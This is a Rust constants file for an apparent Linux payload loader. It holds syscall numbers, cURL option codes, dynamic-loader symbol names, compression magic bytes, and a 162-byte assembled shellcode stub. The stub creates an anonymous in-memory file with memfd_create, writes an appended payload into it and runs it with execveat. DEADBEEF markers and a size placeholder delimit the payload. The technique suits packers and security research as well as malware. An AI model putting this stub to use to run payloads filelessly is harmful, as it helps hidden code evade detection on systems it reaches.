/// Index offset for the `dlsym` symbol in the [`LINUX_UTILITIES`] array.
pub const DLSYM_OFFSET: usize = 0;
/// Index offset for the `dlopen` symbol in the [`LINUX_UTILITIES`] array.
pub const DLOPEN_OFFSET: usize = 1;

#[cfg(feature = "std")]
/// List of Linux dynamic loader and utility function names used for runtime symbol resolution.
pub const LINUX_UTILITIES: &[&str] = &[
    "DlSym",
    "DlOpen",
    "DlError",
    "MemFd_Create",
    "__libc_fork",
    "Execve",
    "__errno_location",
    "__write"
];

/// Load all symbols immediately (`dlopen` flag).
pub const RTLD_NOW: i32 = 0x00002;

/// Lazy-load symbols as they are used (`dlopen` flag).
pub const RTLD_LAZY: i32 = 1;
/// Program header type: Loadable segment.
pub const PT_LOAD: u32 = 1;

/// Program header type: Dynamic linking information segment.
pub const PT_DYNAMIC: u32 = 2;

/// Initialize cURL with SSL support.
pub const CURL_GLOBAL_SSL: u64 = 1 << 0;

/// Initialize cURL with Windows-specific socket support (no-op on Linux).
pub const CURL_GLOBAL_WIN32: u64 = 1 << 1;

/// Initialize cURL with all common features enabled (SSL + Win32).
pub const CURL_GLOBAL_ALL: u64 = CURL_GLOBAL_SSL | CURL_GLOBAL_WIN32;

/// cURL option: Specify custom write data pointer.
pub const CURLOPT_WRITEDATA: u32 = 10001;

/// cURL option: Set the target URL for the request.
pub const CURLOPT_URL: u32 = 10002;

/// cURL option: Provide a custom write callback function.
pub const CURLOPT_WRITEFUNCTION: u32 = 20011;

/// cURL option: Set a custom User-Agent string for the request.
pub const CURLOPT_USERAGENT: u32 = 10018;

/// GZIP file magic number (first two bytes).
pub const GZIP_MAGIC: [u8; 2] = [0x1f, 0x8b];

/// Zlib-compressed data magic byte (first byte).
pub const ZLIB_MAGIC: u8 = 0x78;

/// File permission: Read access for the file owner.
pub const S_IRUSR: u16 = 0o400;

/// File permission: Write access for the file owner.
pub const S_IWUSR: u16 = 0o200;

/// File permission: Execute/search access for the file owner.
pub const S_IXUSR: u16 = 0o100;

/// Open file read-only flag.
pub const O_RDONLY: usize = 0;

/// File descriptor for standard output (`stdout`).
pub const STDOUT: usize = 1;

/// File descriptor for standard error (`stderr`).
pub const STDERR: usize = 2;

/// Memory protection flag: Readable memory region.
pub const PROT_READ: i32 = 1;

/// Memory protection flag: Executable memory region.
pub const PROT_EXEC: i32 = 4;

/// Memory protection flag: Writable memory region.
pub const PROT_WRITE: i32 = 2;

/// Mapping flag: Map memory that is not backed by a file (anonymous mapping).
pub const MAP_ANONYMOUS: i32 = 0x20;

/// Mapping flag: Create a private copy-on-write mapping.
pub const MAP_PRIVATE: i32 = 2;

/// Flag for `mremap`: Allow relocation of the memory region if necessary.
pub const MREMAP_MAYMOVE: i32 = 1;

/// Signal number for abnormal process termination (abort).
pub const SIG_ABRT: usize = 134;

/// Linux syscall number for `write`.
pub const SYS_WRITE: usize = 1;

/// Linux syscall number for `mmap`.
pub const SYS_MMAP: usize = 9;

/// Linux syscall number for `munmap`.
pub const SYS_MUNMAP: usize = 11;

/// Linux syscall number for `close`.
pub const SYS_CLOSE: usize = 3;

/// Linux syscall number for `getdents64` (read directory entries).
pub const SYS_GETDENTS64: usize = 217;

/// Linux syscall number for `open`.
pub const SYS_OPEN: usize = 2;

/// Linux syscall number for `read`.
pub const SYS_READ: usize = 0;

/// Linux syscall number for `lseek`.
pub const SYS_LSEEK: usize = 8;

/// Linux syscall number for `pread64` (read at offset).
pub const SYS_PREAD64: usize = 17;

/// Linux syscall number for `mremap` (resize/move memory mapping).
pub const SYS_MREMAP: usize = 25;

/// Linux syscall number for `exit`.
pub const SYS_EXIT: usize = 60;

/// Linux syscall number for `exit_group` (terminate all threads).
pub const SYS_EXIT_GROUP: usize = 231;

/// Move the file offset to the end of the file.
pub const SEEK_END: usize = 2;

//Created via `nasm -f elf64 assets/build_utils/linux/shellcode_template.asm -o shellcode.o` and `objcopy -O binary -j .text shellcode.o shellcode.bin`
//Created on july 16, 2025

#[cfg(feature = "std")]
/// Stub bootstrap bytes
pub static STUB_BYTES: [u8; 162] = [
    0xe8, 0x00, 0x00, 0x00, 0x00, 0x5b, 0x49, 0x89, 0xda, 0x49, 0x83, 0xea,
    0x05, 0x49, 0x81, 0xc2, 0xa2, 0x00, 0x00, 0x00, 0x48, 0x31, 0xc0, 0x50,
    0x48, 0x89, 0xe7, 0xbe, 0x00, 0x00, 0x00, 0x00, 0xb8, 0x3f, 0x01, 0x00,
    0x00, 0x0f, 0x05, 0x48, 0x85, 0xc0, 0x78, 0x58, 0x49, 0x89, 0xc4, 0x48,
    0x83, 0xc4, 0x08, 0x48, 0xba, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc,
    0xcc, 0x4c, 0x89, 0xd6, 0x4c, 0x89, 0xe7, 0xb8, 0x01, 0x00, 0x00, 0x00,
    0x0f, 0x05, 0x48, 0x85, 0xc0, 0x78, 0x35, 0x48, 0x83, 0xec, 0x10, 0x48,
    0x8d, 0x83, 0x84, 0x00, 0x00, 0x00, 0x48, 0x89, 0x04, 0x24, 0x48, 0xc7,
    0x44, 0x24, 0x08, 0x00, 0x00, 0x00, 0x00, 0x48, 0x89, 0xe2, 0x4c, 0x89,
    0xe7, 0x48, 0x8d, 0xb3, 0x8c, 0x00, 0x00, 0x00, 0x4d, 0x31, 0xd2, 0x41,
    0xb8, 0x00, 0x10, 0x00, 0x00, 0xb8, 0x42, 0x01, 0x00, 0x00, 0x0f, 0x05,
    0x48, 0x83, 0xc4, 0x10, 0xc3, 0x2f, 0x6c, 0x6f, 0x61, 0x64, 0x65, 0x72,
    0x00, 0x00, 0xde, 0xad, 0xbe, 0xef, 0xde, 0xad, 0xbe, 0xef, 0xde, 0xad,
    0xbe, 0xef, 0xde, 0xad, 0xbe, 0xef,
];


#[cfg(feature = "std")]
/// Marker bytes to indicate that after them, the payload begins
pub static PAYLOAD_MARKER_BYTES: &[u8] = b"\xDE\xAD\xBE\xEF\xDE\xAD\xBE\xEF\xDE\xAD\xBE\xEF\xDE\xAD\xBE\xEF";

#[cfg(feature = "std")]
/// Pattern that marks the total loader size
pub const TOTAL_LDR_SIZE_PATTERN: [u8; 10] = {
    let bytes = 0xCCCCCCCCCCCCCCCCu64.to_le_bytes();
    [0x48, 0xBA, bytes[0], bytes[1], bytes[2], bytes[3], bytes[4], bytes[5], bytes[6], bytes[7]]
};

#[cfg(feature = "std")]
/// Data marker to indicate the loader is here. Will remove in the future
pub static LOADER_PATH_NAME_DATA_MARKER: &[u8] = b"/loader\0";